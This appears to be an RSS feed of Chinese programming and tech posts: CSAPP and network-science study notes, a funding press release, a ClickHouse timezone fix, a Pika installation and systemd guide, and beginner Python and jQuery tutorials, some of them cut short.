文件就是字节序列
，仅此而已。每个I/O设备，包括磁盘、键盘、显示器，甚至网络，都可以看成是文件。
系统中的所有输入输出都是通过使用一小组称为 Unix I/O 的系统函数调用读写文件来实现的。
1.8 系统之间利用网络通信
我们一直把系统视为一个孤立的硬件和软件的集合体，实际上，现代系统经常通过网络和其他系统连接到一起。
从一个单独的系统来看，网络可视为一个 I/O 设备
。当系统从主存复制一串字节到网络适配器时，数据流经过网络到达另一台机器，而不是比如说到达本地磁盘驱动器。相似地，系统可以读取从其他机器发送来的数据，并把数据复制到自己的主存。
假设用本地主机上的 telnet 客户端连接远程主机上的 telnet 服务器。在我们登录到远程主机并运行 shell 后，远端的 shell 就在等待接收输入命令。此后在远端运行 hello 程序包括如图 1-15 所示的五个基本步骤。
当我们在 telnet 客户端键入 “hello” 字符串并敲下回车键后，客户端软件就会将这个字符串发送到 telnet 的服务器。telnet 服务器从网络上接收到这个字符串后，会把它传递给远端 shell 程序。接下来，远端 shell 运行 hello 程序，并将输出行返回给 telnet 服务器。最后，telnet 服务器通过网络把输出串转发给 telnet 客户端，客户端就将输出串输出到我们的本地终端上。
1.9 重要主题
1.9.1 Amdahl 定律
主要思想：当我们对系统的某个部分加速时，其对系统整体性能的影响取决于该部分的重要性和加速程度。
若系统执行某应用程序需要的时间为Told。分所假设系统某部需执行时间与该时间的比例为α，而该部分性能提升为k。即该部分初始所需时间为αTold，现在所需时间为(αTold)/k。因此，总的执行时间应为：
1.9.2 并发和并行
并发：指一个同时具有多个活动的系统
并行：用并发来使得一个系统运行得更快。
1. 线程级并发
使用线程可以在一个进程中执行多个控制流。
当构建一个由
单操作系统内核控制的多处理器组成的系统
时，我们就得到了一个
多处理器系统
多核处理器是将多个 CPU（称为“核”）集成到一个集成电路芯片上。
超线程也称为同时多线程，是一项允许一个CPU执行多个控制流的技术。
2、指令级并行
可以同时执行多条指令
如果处理器可以达到比一个周期一条指令更快的执行效率，就称之为超标量（super-scalar）处理器。
大多数现代处理器都支持超标量操作。
3、单指令、多数据并行
允许一条指令产生多个可以并行执行的操作，这种方式称为单指令、多数据，即是SIMD并行
1.9.3 计算机系统中抽象的重要性
在处理器里，指令集架构提供了对实际处理器硬件的抽象。使用这个抽象，机器代码程序表现得就好像运行在一个一次只执行一条指令的处理器上。
文件是对I/O设备的抽象表示，虚拟内存是对主存和磁盘I/O设备的抽象表示，进程则是对一个正在运行的程序的抽象表示。虚拟机提供对整个计算机的抽象。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540059.html</guid><pubDate>Fri, 31 Oct 2025 07:22:29 +0000</pubDate></item><item><title>网络学习笔记</title><link>https://www.ppmy.cn/news/1540060.html</link><description>一、网络的结构与功能
网络的鲁棒性与抗毁性
如果在移走少量节点后网络中的绝大部分节点仍然是连通的，那么就该网络的连通性对节点故障具有鲁棒性
网络上的动力学
动力系统：
自旋、振子或混沌的同步、可激发系统
传播过程：
信息传播与拥堵、网络搜寻、运输过程、疾病传播、谣言的传播、舆论形成
网络同步：网络同步主要取决于网络的拓扑结构和节点的动力学
二、网络上的疾病传播
完全混合下的疾病传播模型：
SIR模型
网络免疫技术：
熟识者免疫：从含有N个节点的网络中随机选择比例为p的节点，再从每一个呗选出的节点中随机选择它的一个邻居节点进行免疫。这种免疫策略不需要网络的全局信息。
目标免疫：通过有选择地对少量关键节点进行免疫的一种策略。（针对SIS模型）
随机选择个体进行免疫。（针对SIR模型）
三、网络上的随机游走
复杂网络上的随机游走是指以网络节点为载体，按照一定概率从网络上任一节点转移到与之有连接的其他节点的状态转移过程。
几个重要特征量：
平均首达时间：游走者从任意起点首次到达目标节点的时间的平均值
平均通勤时间：游走者从起点到终点，然后由终点返回到起点所需要的平均时间
平均返回时间：游走者离开某节点后第一次返回该节点的平均时间
覆盖时间：一个游走者访问所有节点所需要的时间
三、网络上的同步
两个或多个动力学系统，除了自身的演化外，其间还有相互作用（耦合），这种作用既可以是单向的，也可以是双向的。
当满足一定条件时，在耦合的影响下，这些系统的状态输出就会逐渐趋向进而完全相等，称为同步（精确同步）
四、网络节点的重要性
度中心性：度中心性认为一个节点的邻居数目越多，影响力就越大，这就是网络中刻画节点重要性最简单的指标
介数中心性：刻画了节点对网络中沿最短路径传输的网络流的控制力
节点重要性判别方法：
基于节点近邻的方法
度中心性、半局部中心性、K-壳分解、H-index
基于路径的方法
接近中心性、介数中心性、离心中心性、流介数中心性、Katz中心性、连通介数中心性
基于特征向量的方法
特征向量 中心性、PageRank中心性、LeaderRank中心性、Hits中心性
基于节点移除或收缩的方法
节点的重要性往往体现在该节点呗移除之后对网络的破坏性（或对特定功能的影响）
五、二分网络
定义：
二分网络的社团结构：</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540060.html</guid><pubDate>Fri, 31 Oct 2025 07:22:31 +0000</pubDate></item><item><title>基因科技领军企业——桐树基因完成D轮融资，创新科技引领生命科学</title><link>https://www.ppmy.cn/news/1540061.html</link><description>2024年10月8日，无锡桐树生物科技有限公司（以下简称桐树基因）正式完成过亿元人民币D轮融资。本轮融资由无锡市梁溪科创产业投资基金（博华资本管理）领投，江苏建道创业投资有限公司跟投，总额过亿元人民币。此次 D 轮融资的成功，不仅体现了投资者对桐树基因的高度认可和巨大信心，也彰显了公司在基因检测领域的极大潜力。这笔资金将主要用于公司持续加强研发投入、扩大生产规模、拓展市场渠道以及提升品牌影响力。
桐树基因在基因检测领域深耕7年，坚持以医院为核心的“产品 服务”布局，从临床需求端出发，开发出了一系列具有极高技术壁垒的IVD诊断技术。在IVD体外诊断领域产品开发领域，拥有全面完整的技术平台和全面、深度的技术覆盖。基于多平台创新的核心理念技术，在一代测序平台，二代测序平台，荧光定量PCR，CRISPR等领域都研发出了拥有具有核心技术优势的IVD产品。
桐树基因自主研发的微卫星不稳定检测试剂盒于2021年1月获国内MSI检测首张三类医疗器械注册证，在胃癌、结直肠癌、乳腺癌等17种肿瘤检测领域具有唯一的先发优势。
2024年3月桐树基因研发的全位点奥希替尼伴随诊断试剂盒成功上市，填补国内空白。改试剂盒采用非ARMS-PCR法，利用MASS专利技术，精准识别EGFR基因突变，为肺癌精准治疗提供可靠依据。
桐树基因立足国内市场，积极地拓展销售渠道，基因检测服务已经覆盖全国30多个省/市/自治区的1000多家医院。桐树基因销售团队经过多年磨合历练，销售能力业内。公司成立7年来销售收入实现高速增长，现已稳居行业第一梯队。随着更多重磅产品逐一获证，未来有望在千亿级精准医学肿瘤市场成为领跑者。
桐树基因的产品和服务为临床医生提供更准确的诊断依据，帮助患者制定个性化的治疗方案，提高治疗效果。桐树基因注重社会责任，积极参与公益活动，推动肿瘤基因检测技术的应用，桐树基因将继续秉承“创新•为肿瘤患者创造价值”的理念，不断为人类健康事业和构建健康社会贡献力量。
以新质生产力为强引擎，科技创新引领生命科学，桐树基因推动癌症治疗进入精准医疗新时代。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540061.html</guid><pubDate>Fri, 31 Oct 2025 07:22:34 +0000</pubDate></item><item><title>ClickHouse入库时间与实际相差8小时问题</title><link>https://www.ppmy.cn/news/1540062.html</link><description>原因一：服务端未修改默认时区
解决方案：
1、找 ClickHouse 配置文件 config.xml，通常位于 /etc/clickhouse-server/ 目录。
2、编辑 config.xml 文件，找到 标签。如果标签不存在，需要手动添加。
3、修改 标签的内容为 Asia/Shanghai。
原因二：数据库连接工具未修改驱动属性
右键编辑链接，找到驱动属性往下拉找到use_server_time_zone与use_server_time_zone_for_dates改为true,找到use_time_zone改为Asia/Shanghai。同理，也有可能是代码JDBC驱动属性未修改导致的。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540062.html</guid><pubDate>Fri, 31 Oct 2025 07:22:37 +0000</pubDate></item><item><title>Redis 性能优化选择：Pika 的配置与使用详解</title><link>https://www.ppmy.cn/news/1540063.html</link><description>引言
在我们日常开发中 redis是我们开发业务场景中不可缺少的部分。Redis 凭借其内存存储和快速响应的特点，广泛应用于缓存、消息队列等各种业务场景。然而，随着数据量的不断增长，单节点的 Redis 因为内存限制和并发能力的局限，逐渐难以支撑高并发的请求。为了解决这些问题，我们通常会采用 搭建Redis 集群方案来解决高并发下的限制问题。然而，Redis 集群的部署往往需要更高的资源投入，巨大的内存需求和运维成本带来了不小的压力。除此之外，集群模式下的数据分片和一致性问题，也让系统设计的复杂度大大增加。
在这种高并发、大流量的业务场景下，我们是否能够在追求 Redis 高性能的同时，找到更经济高效的大数据解决方案呢？除了 Redis 集群方案外，今天我将介绍一种可以替代 Redis 集群的方案，也是我在以往开发中广泛使用的一种数据结构——Pika。Pika 在兼容 Redis API 的基础上，将数据存储在磁盘上，突破了内存限制，尤其适合大数据存储和高并发访问的需求。
什么是 Pika？
Pika 是一种兼容 Redis 协议的高效存储引擎，设计初衷就是为了解决 Redis 在大数据场景下因内存限制而带来的瓶颈问题。与 Redis 将数据存储在内存中的方式不同，Pika 将数据存储在磁盘上，从而有效扩展存储容量，适应大规模数据的需求。当 Redis 的内存使用量超过 16 GiB 时，会面临多种限制，如内存容量受限、单线程阻塞、启动恢复时间长、内存硬件成本高、缓冲区容易填满、一主多从故障时的切换成本高等。
Pika 的出现并非为了替代 Redis，而是为了补充 Redis
，以便在大数据场景下依然保持高性能。Pika 力求完全遵守 Redis 协议，继承 Redis 便捷的运维设计，同时通过持久化存储来突破 Redis 在数据量巨大时内存容量不足的瓶颈。此外，Pika 支持通过
slaveof
命令进行主从模式配置，支持全量和增量数据同步，方便在大数据和高可用场景下的灵活扩展。
Pika 的兼容性
Pika 兼容 Redis 中的
string
、
hash
、
list
、
zset
和
set
五大核心数据类型，能够支持大部分与之相关的操作接口（兼容详情可查阅官方文档），实现了几乎所有 Redis 的基本操作需求。这意味着，现有的 Redis 客户端和命令都可以无缝迁移到 Pika 上使用，无需额外学习新的命令或语法。
Pika 的主从备份能力
与 Redis 一样，Pika 支持通过
slaveof
命令进行主从复制，提供可靠的备份和高可用性支持。同时，Pika 实现了全同步和部分同步机制，能够在数据同步中做到既灵活又高效，确保数据一致性和稳定性。这样，Pika 既保留了 Redis 数据复制的优势，又在容量上扩展了存储空间，可以在不更改代码的前提下快速接入生产环境。
为什么选择 Pika？
Pika 提供了与 Redis 一致的使用体验，且不需要额外的学习和开发成本。相较于 Redis，Pika 的优势体现在以下几方面：
更大的存储容量
：Pika 通过磁盘存储解决了 Redis 的内存瓶颈问题，适合大规模数据场景。
无缝替换
：Pika 兼容 Redis 绝大多数核心命令，因此在功能实现和操作上与 Redis 几乎无异，用户不必更改现有代码或熟悉新的命令，即可将 Pika 集成到现有系统中。
高可用性和备份支持
：Pika 支持主从复制、全同步和部分同步，确保数据可靠性和高并发访问。
Pika 的适用场景
Pika 的设计非常适合以下几种高容量、高并发的数据场景：
大数据量缓存
：对于数据规模庞大的应用，比如实时数据处理、日志收集和分析场景，Pika 的磁盘存储使它能轻松应对 TB 级数据，不再受限于内存容量。适用于金融、广告、物联网等需要存储大量实时数据的行业。
高并发访问场景
：在流量密集型业务中，如电商、游戏和社交网络，Pika 能够支持高并发访问需求，与 Redis 一样实现快速的数据读写，但在资源消耗上更经济。
长时间数据存储
：在日志存储、历史数据存储等业务中，数据需要长时间保留，但访问频率相对较低。Pika 的磁盘持久化存储方式为此类场景提供了低成本的替代方案，不会因数据量增加而导致内存压力上升。
分布式集群环境
：对于需要高可用性的数据集群应用，Pika 的主从复制和同步功能使其可以在分布式环境中稳定运行，支持多节点备份和容灾切换，确保数据的高可靠性和一致性。
Pika使用用户
Pika 已被各大公司广泛采用，用于内部部署，证明了其可扩展性和可靠性。一些值得注意的使用实例包括：
360公司
：内部部署，规模10000+实例，单机数据量1.8TB。
微博
：内部部署，有10000+个实例。
喜马拉雅(Xcache)
：6000+实例，海量数据超过120TB。
个推 公司
：内部部署，300+实例，累计数据量超过30TB。
此外，迅雷、小米、知乎、好未来、快手、搜狐、美团、脉脉等公司也在使用 Pika。有关完整用户列表，可以参考 Pika 项目提供的官方列表。
这些在不同公司和行业的部署凸显了 Pika 在处理大规模、大容量数据存储需求方面的适应性和有效性。
接下来，我将展示如何安装 Pika，并进行简单的使用示例，以便快速上手并体验 Pika 的性能。
安装之前我们先看下官方给的安装示例：安装示例
我按照官方的安装示例 安装的是v4.0.1最新版本及之前版本。但是我一直未make或build成功。不知道是不是我自己环境的问题。
本文章采用下载安装包的形式来安装
首先我们去版本库下载对应版本的安装包（我选择是v3.3.0）
将安装包上传到
/usr/local/pika
目录中，便于管理：
sudo
mkdir
-p /usr/local/pika
然后解压该安装包
sudo
tar
-xvf  pika-linux-x86_64-v3.3.0.tar.bz2
解压完成后会生成一个
output
文件夹，接下来我们执行命令启动
./output/bin/pika -c ./output/conf/pika.confb
我第一次启动报错了 报错如下：
这个错误提示主要有两个原因：1.
Rsync 失败
：
pika_rsync_service.cc:48
报错提示无法启动
rsync
服务，可能是
rsync
没有安装或者路径配置有问题。
2.
端口绑定失败
：提示
bind port 10221 failed
，表示 Pika 无法绑定端口
10221
，可能是端口被占用，或者当前用户权限不足。
Pika 使用
rsync
进行数据同步，请确保系统已安装
rsync
：
sudo
yum
install
-y
rsync
安装完成后，重新尝试启动 Pika。
使用以下命令检查是否有其他进程占用了
10221
端口：
sudo
lsof
-i :10221
如果有其他进程占用端口，可以尝试停止占用端口的进程，或者更改 Pika 的端口配置。
解决上面问题后 我尝试重新启动，可以看到已经成功启动:
启动成功后我们另开一个窗口来测试操作简单命令：
我们来大概看下安装的Pika配置文件 在
output/conf
下的
pika.conf
:
# Pika port
port : 9221  # Pika 监听的端口# Thread Number
thread-num : 1  # 用于处理客户端请求的工作线程数# Thread Pool Size
thread-pool-size : 12  # 线程池大小，用于处理并发任务# Sync Thread Number
sync-thread-num : 6  # 用于主从同步的线程数# Pika log path
log-path : ./log/  # 日志文件的存储路径# Pika db path
db-path : ./db/  # 数据库文件的存储路径# Pika write-buffer-size
write-buffer-size : 268435456  # 写缓冲区大小，单位为字节（256MB）# Pika timeout
timeout : 60  # 客户端连接空闲超时时间，单位为秒# Requirepass
requirepass :  # 设置管理员密码，用于验证高权限操作# Masterauth
masterauth :  # 从节点连接主节点时的认证密码# Userpass
userpass :  # 普通用户连接的密码# User Blacklist
userblacklist :  # 黑名单用户列表，拒绝指定用户访问# Pika instance mode [classic | sharding]
instance-mode : classic  # Pika 的实例模式：classic 为多数据库模式，sharding 为分片模式# Set the number of databases. Limited in [1, 8]
databases : 1  # 数据库数量，仅在 classic 模式下有效# default slot number each table in sharding mode
default-slot-num : 1024  # 每张表的分片数量，仅在 sharding 模式下有效# replication num defines followers in a single raft group, limited in [0, 4]
replication-num : 0  # Raft 组中的从节点数量# consensus level defines confirms before commit to client
consensus-level : 0  # 主节点提交前需要的确认数量，用于 Raft 一致性协议# Dump Prefix
dump-prefix :  # 导出文件的前缀，用于数据持久化文件命名# daemonize  [yes | no]
#daemonize : yes  # 是否以守护进程方式运行（后台运行）# Dump Path
dump-path : ./dump/  # 数据导出路径# Expire-dump-days
dump-expire : 0  # 数据导出的过期天数（0 表示不过期）# pidfile Path
pidfile : ./pika.pid  # Pika 进程 ID 文件路径# Max Connection
maxclients : 20000  # 最大客户端连接数# the per file size of sst to compact, default is 20M
target-file-size-base : 20971520  # 每个 SST 文件的目标大小（20MB）# Expire-logs-days
expire-logs-days : 7  # 日志文件的过期天数# Expire-logs-nums
expire-logs-nums : 10  # 日志文件的最大数量# Root-connection-num
root-connection-num : 2  # root 用户的最大连接数# Slowlog-write-errorlog
slowlog-write-errorlog : no  # 慢查询日志是否写入错误日志文件# Slowlog-log-slower-than
slowlog-log-slower-than : 10000  # 慢查询记录的时间阈值，单位为微秒# Slowlog-max-len
slowlog-max-len : 128  # 慢查询日志的最大条数# Pika db sync path
db-sync-path : ./dbsync/  # 数据同步文件的存储路径# db sync speed(MB) max is set to 1024MB, min is set to 0
db-sync-speed : -1  # 主从同步的最大速度，单位为 MB/s，-1 表示无限制# The slave priority
slave-priority : 100  # 从节点的优先级# network interface
#network-interface : eth1  # 网络接口（可以指定特定的网卡）# replication
#slaveof : master-ip:master-port  # 设置为从节点并指定主节点地址和端口# CronTask, e.g., 02-04/60 for compaction between 2-4am every day
#compact-cron : 3/02-04/60  # 压缩任务计划：在每周三的 2-4 点进行压缩# Compact-interval, e.g., 6/60 checks compaction every 6 hours
#compact-interval :  # 压缩间隔，单位为小时。比 compact-cron 优先# sync window size for binlog between master and slave, default is 9000
sync-window-size : 9000  # 主从同步的 binlog 窗口大小# max connection read buffer size, default is 256MB
max-conn-rbuf-size : 268435456  # 最大读取缓冲区大小###################
## Critical Settings
###################
# write_binlog  [yes | no]
write-binlog : yes  # 是否开启 binlog 日志记录# binlog file size: default is 100M,  limited in [1K, 2G]
binlog-file-size : 104857600  # binlog 文件大小限制（100MB）# Use cache to store up to 'max-cache-statistic-keys' keys
max-cache-statistic-keys : 0  # 缓存的统计键的最大数量，0 表示关闭此功能# Trigger small compaction after deleting/overwriting keys
small-compaction-threshold : 5000  # 触发小压缩的操作次数阈值# Flush triggered if all live memtables exceed this limit
max-write-buffer-size : 10737418240  # 所有 memtables 的总内存大小上限（10GB）# Limit some command response size
max-client-response-size : 1073741824  # 限制响应大小的最大值（1GB）# Compression type supported [snappy, zlib, lz4, zstd]
compression : snappy  # 数据压缩类型# max-background-flushes: default is 1, limited in [1, 4]
max-background-flushes : 1  # 后台刷新任务的最大数量# max-background-compactions: default is 2, limited in [1, 8]
max-background-compactions : 2  # 后台压缩任务的最大数量# Maximum cached open file descriptors
max-cache-files : 5000  # 缓存的最大打开文件描述符数量# max_bytes_for_level_multiplier: default is 10, can change to 5
max-bytes-for-level-multiplier : 10  # RocksDB 层次的最大字节数乘数# BlockBasedTable block_size, default 4k
# block-size: 4096  # 块表的块大小（4KB）# block LRU cache, default 8M, 0 to disable
# block-cache: 8388608  # LRU 块缓存大小（8MB）# whether the block cache is shared among RocksDB instances
# share-block-cache: no  # 是否在多个 RocksDB 实例之间共享块缓存# whether index and filter blocks are in block cache
# cache-index-and-filter-blocks: no  # 是否将索引和过滤块放入块缓存# bloomfilter of the last level will not be built if set to yes
# optimize-filters-for-hits: no  # 是否优化最后一层的布隆过滤器# Enables dynamic levels target size for compaction
# level-compaction-dynamic-level-bytes: no  # 是否启用动态级别的压缩目标大小
根据配置文件的配置项可以根据自己的需求更改
在每次启动时手动执行启动命令既麻烦又不便于管理。为此，我们可以通过 Systemd 配置一个服务，使 Pika 开机自启并便于系统控制，提升管理效率。
配置启动服务
创建 Pika 系统用户
为了提高安全性，创建一个专用的系统用户和用户组来运行 Pika(在/usr/local/pika下执行)：
sudo
groupadd
--system pika
sudo
useradd
-M -s /sbin/nologin -g pika -d /usr/local/pika pika
设置文件拥有者
chown
-R pika:pika output
配置 Pika 作为 Systemd 服务
在
/usr/lib/systemd/system
目录下创建
pika.service
文件：
cat
&gt;
/usr/lib/systemd/system/pika.service
&lt;&lt;
EOF[Unit]
Description=pika server
Requires=network.target
After=network.target[Service]
User=pika
Group=pika
Type=forking
WorkingDirectory=/usr/local/pika/output
ExecStart=/usr/local/pika/output/bin/pika -c /usr/local/pika/output/conf/pika.conf
Restart=always[Install]
WantedBy=multi-user.target
EOF
确保
WorkingDirectory
路径是有效的目录，并且已经在系统中正确创建。根据您之前的路径配置，将
WorkingDirectory
修改为实际存在的路径，例如：WorkingDirectory=/usr/local/pika/pika-v4.0.1
ExecStart=/usr/local/pika/pika-v4.0.1-alpha/output/pika -c /usr/local/pika/pika-v4.0.1-alpha/conf/pika.conf
增加文件描述符限制
为确保高并发场景下的稳定性，增加文件描述符的限制：
创建
pika.service.d
目录：
sudo
mkdir
-p /etc/systemd/system/pika.service.d
在该目录下创建
limit.conf
文件：
sudo
cat
&gt;
/etc/systemd/system/pika.service.d/limit.conf
&lt;&lt;
EOF 
[Service] 
LimitNOFILE=65536 
EOF
启动和管理 Pika 服务
完成配置后，可以使用以下命令来管理 Pika：
# 重新加载 systemd 配置文件
sudo
systemctl daemon-reload
# 启动 Pika 服务
sudo
systemctl start pika
# 设置 Pika 开机启动
sudo
systemctl
enable
pika
# 检查服务状态
sudo
systemctl status pika
通过以上步骤，Pika 已成功安装并配置为 systemd 服务，支持自动启动、停止和重启管理，方便在生产环境中使用。这样不仅简化了管理，还提高了服务的稳定性。
注意事项
在安装和配置 Pika 后，以下几点是需要特别注意的，以便更好地理解 Pika 的使用场景和性能表现：
线程模型
Pika 是多线程设计，不同于 Redis 的单线程模型，这使得 Pika 能在大多数多核 CPU 环境下有效地处理更多的并发请求。这种设计更适合于大量数据的场景，尤其是在持久化存储需求强烈的场合。
适用场景
大数据、高容量场景
：Pika 在大数据和持久化存储的场景下更具优势。例如，当 Redis 内存超出 16GB 后可能出现瓶颈，Pika 则通过将数据存储在磁盘上而不依赖于内存，有效解决了存储容量的限制问题。
写密集型操作
：在写密集型操作时，Pika 的多线程设计使其在高并发写入场景中表现更优。
性能限制
虽然 Pika 在某些场景下优于 Redis，但它并非在所有情况下都优于 Redis，也不能完全取代 Redis。在高性能内存操作和极低延迟需求的场景下，例如高速缓存、实时性极高的操作，Redis 的内存操作速度更具优势。
主从同步和故障恢复
Pika 支持通过
slaveof
命令配置主从关系，但其同步机制依赖于磁盘 I/O，可能会导致与 Redis 相比稍微较慢的同步速度。对于高频数据变更或对数据实时性要求较高的场景，可能仍需要 Redis 提供更快的响应。
存储开销
因为 Pika 依赖磁盘存储，所以需要保证存储空间充足并定期清理过期数据。过大的数据集可能会导致磁盘 I/O 增加，从而对系统的整体性能产生影响。
选择依据
Pika 并不是 Redis 的完全替代品。在决定使用 Pika 或 Redis 时，最好结合业务场景：如果数据量较小且关注内存操作的速度，Redis 更合适；而在持久化需求高、数据量大或关注磁盘存储扩展性的场景下，Pika 更适用。
最后
Pika 作为一种兼容 Redis 协议的高效存储引擎，在大数据和持久化存储需求的业务场景中，为 Redis 用户提供了一个强有力的补充方案。Pika 通过将数据存储在磁盘上，有效突破了 Redis 在内存容量上的限制，同时保持了 Redis 的高效操作体验和简便的管理特性。得益于多线程设计，Pika 能在写密集和大容量场景中表现优异，尤其适合那些对数据持久化、扩展性要求较高的场合。
然而，Pika 并非 Redis 的完全替代品。在需要极低延迟、以缓存为核心的场景中，Redis 仍然具备不可替代的优势。因此，选择 Pika 或 Redis 需要结合具体的业务需求，权衡各自的优缺点。总体而言，Pika 在特定的应用场景下能够发挥重要作用，是 Redis 在大数据场景中的有益补充。希望通过本次配置和使用指南，大家能够更好地理解 Pika 的特性和适用性，为项目需求提供更高效的解决方案。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540063.html</guid><pubDate>Fri, 31 Oct 2025 07:22:40 +0000</pubDate></item><item><title>【python】list（列表）的遍历</title><link>https://www.ppmy.cn/news/1540064.html</link><description>目录
数据容器入门
数据容器：list（列表）
list（列表）的遍历
数据容器：tuple（元组）
数据容器：str（字符串）
数据容器的切片
数据容器：set（集合）
数据容器：dict（字典、映射）
数据容器的通用操作
综合案例
学习目标
掌握使用 while 循环，遍历列表的元素
掌握使用 for 循环，遍历列表的元素
列表的遍历- while 循环
既然数据容器可以存储多个元素，那么，就会有需求从容器内依次取出元素进行操作。
将容器内的元素依次取出进行处理的行为，称之为：遍历、迭代。
如何遍历列表的元素呢？
可以使用前面学过的
while
循环
如何在循环中取出列表的元素呢？
使用
列表[下标]
的方式取出
循环条件如何控制？
定义一个变量表示下标，从 0 开始
循环条件为
下标值 &lt; 列表的元素数量
index
=
0
while
index
&lt;
len
(
列表
)
:
元素
=
列表
[
index
]
对元素进行处理index
+=
1
演示：
def
list_while_func
(
)
:
"""使用while循环遍历列表的演示函数:return: None"""
my_list
=
[
"Hello"
,
"World"
,
"Python"
]
# 循坏控制变量通过下标索引来控制，默认0
# 每一次循环将下标索引变量+1
# 循环条件：下标索引变量 &lt; 列表的元素数量
# 定义一个变量用来标记列表的下标
index
=
0
# 初始值为0
while
index
&lt;
len
(
my_list
)
:
# 通过index变量取出对应下标的元素
element
=
my_list
[
index
]
print
(
f"列表的元素：
{
element
}
"
)
# 至关重要 将循环变量（index）每一次循环都+1
index
+=
1
list_while_func
(
)
输出结果：
列表的元素：Hello
列表的元素：World
列表的元素：Python
列表的遍历- for 循环
除了 while 循环外，Python 中还有另外一种循环形式：for 循环。
对比 while，for 循环更加适合对列表等数据容器进行遍历。
语法：
for
临时变量
in
数据容器
:
对临时变量进行处理
表示，从容器内，依次取出元素并赋值到临时变量上。
在每一次的循环中，我们可以对临时变量（元素)进行处理。
演示：
def
list_for_func
(
)
:
"""使用for循环遍历列表的演示函数:return: None"""
my_list
=
[
1
,
2
,
3
,
4
,
5
]
# for 临时变量 in 数据容器:
for
element
in
my_list
:
print
(
f"列表的元素有：
{
element
}
"
)
list_for_func
(
)
输出结果：
列表的元素有：1
列表的元素有：2
列表的元素有：3
列表的元素有：4
列表的元素有：5
while 循环和 for 循环的对比
while
循环和
for
循环，都是循环语句，但细节不同：
在循环控制上：
while
循环可以
自定循环条件
，并自行控制
for
循环
不可以自定循环条件
，只可以一个个从容器内取出数据
在无限循环上：
while
循环
可以
通过条件控制做到无限循环
for
循环理论上
不可以
，因为被遍历的容器容量不是无限的
在使用场景上：
while
循环适用于任何想要循环的场景
for
循环适用于，遍历数据容器的场景或简单的固定次数循环场景
总结：
什么是遍历？
将容器内的元素依次取出，并处理，称之为遍历操作
如何遍历列表的元素？
可以使用
while
或
for
循环
for 循环的语法：
for
临时变量
in
数据容器
:
对临时变量进行处理
for 循环和 while 对比
for
循环更简单，
while
更灵活
for
用于从容器内依次取出元素并处理，
while
用以任何需要循环的场景
练习案例：取出列表内的偶数
定义一个列表，内容是：[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
遍历列表，取出列表内的偶数，并存入一个新的列表对象中
使用 while 循环和 for 循环各操作一次
通过while循环，从列表：[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]中取出偶数，组成新列表：[2, 4, 6, 8, 10]
通过for循环，从列表：[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]中取出偶数，组成新列表：[2, 4, 6, 8, 10]
提示：
通过if判断来确认偶数
通过列表的append方法，来增加元素
if 数字%2 == 0:
# while循环操作一次
my_list
=
[
1
,
2
,
3
,
4
,
5
,
6
,
7
,
8
,
9
,
10
]
new_list
=
[
]
index
=
0
while
index
&lt;
len
(
my_list
)
:
if
my_list
[
index
]
%
2
==
0
:
new_list
.
append
(
my_list
[
index
]
)
index
+=
1
print
(
f"通过while循环，从列表：
{
my_list
}
中取出偶数，组成新列表：
{
new_list
}
"
)
输出结果：
通过while循环，从列表：[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]中取出偶数，组成新列表：[2, 4, 6, 8, 10]
# for循环操作一次
my_list
=
[
1
,
2
,
3
,
4
,
5
,
6
,
7
,
8
,
9
,
10
]
new_list
=
[
]
for
element
in
my_list
:
if
element
%
2
==
0
:
new_list
.
append
(
element
)
print
(
f"通过for循环，从列表：
{
my_list
}
中取出偶数，组成新列表：
{
new_list
}
"
)
输出结果：
通过for循环，从列表：[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]中取出偶数，组成新列表：[2, 4, 6, 8, 10]</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540064.html</guid><pubDate>Fri, 31 Oct 2025 07:22:43 +0000</pubDate></item><item><title>你真的了解Canvas吗--解密十【ZRender篇】</title><link>https://www.ppmy.cn/news/1540065.html</link><description>目录
👊🏻入口
动画讲解二
Animator
Element
Transformable
graphic
总结
书接上篇你真的了解Canvas吗--解密九【ZRender篇】由于一个bug的篇幅需要续写这个下篇，不过那块的bug内容对我们这篇要讲的动画也是息息相关的，因为Transformable这个类主要就是和变换相关，于是就有了接下来说的scale
👊🏻入口
&lt;div id="main"&gt;&lt;/div&gt;
&lt;input type="range" id="global-scale-ratio" min="0" max="2" value="1" step="0.1"&gt;
&lt;script type="text/javascript"&gt;var main = document.getElementById('main');</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540065.html</guid><pubDate>Fri, 31 Oct 2025 07:22:45 +0000</pubDate></item><item><title>jQuery基础教程：掌握核心特性与操作方法</title><link>https://www.ppmy.cn/news/1540066.html</link><description>生活要么是一次大胆的冒险，要么什么都不是
文章目录
jQuery操作样式
jQuery操作属性
jquery动画
jQuery节点操作
jQuery尺寸和位置操作
jQuery事件机制
jQuery事件对象
jQuery能够绑定的事件
jQuery扩展
jQuery操作样式
css操作
设置单个样式：
$obj.css(name，value)
name：需要设置的样式操作
value：对应的样式值
设置多个样式：
$obj.css(obj)
obj(参数)是一个对象，对象中包含了需要设置的样式名和样式值
注意：
设置操作的时候，如果是多个元素，那么给所有的元素设置相同的值
获取样式：
$obj.css(name)
name：需要获取的样式名称
注意：
获取操作的时候,如果是多个元素，那么只会返回第一个元素的值
&lt;!
DOCTYPE
html
&gt;
&lt;
html
lang
=
"
en
"
&gt;
&lt;
head
&gt;
&lt;
meta
charset
=
"
UTF-8
"
&gt;
&lt;
meta
name
=
"
viewport
"
content
=
"
width=device-width, initial-scale=1.0
"
&gt;
&lt;
title
&gt;
Document
&lt;/
title
&gt;
&lt;/
head
&gt;
&lt;
body
&gt;
&lt;
div
class
=
"
box
"
&gt;
今天也要加油呀
&lt;/
div
&gt;
&lt;
div
id
=
"
box
"
&gt;
加油呀
&lt;/
div
&gt;
&lt;
script
src
=
"
jquery-3.3.1.min.js
"
&gt;
&lt;/
script
&gt;
&lt;
script
&gt;
// 设置单个样式
$
(
'.box'
)
.
css
(
'backgroundColor'
,
'pink'
)
// 设置多个样式
$
(
'#box'
)
.
css
(
{
'width'
:
'100px'
,
'height'
:
'100px'
,
'margin-top'
:
'10px'
,
'backgroundColor'
:
'green'
}
)
&lt;/
script
&gt;
